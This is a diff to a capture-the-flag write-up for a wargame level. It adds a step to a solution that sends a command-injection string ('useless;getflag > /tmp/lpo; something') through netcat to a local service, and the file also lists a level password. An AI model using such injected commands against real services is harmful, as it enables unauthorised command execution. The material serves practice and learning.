@@ -19,6 +19,7 @@ pass : feulo4b72j7edeahuete3no7c
 ## Solution
 ```bash
 echo "useless;getflag > /tmp/lpo; something" | nc localhost 5151
+cat /tmp/lpo
 ```
 
 - flag11 : 
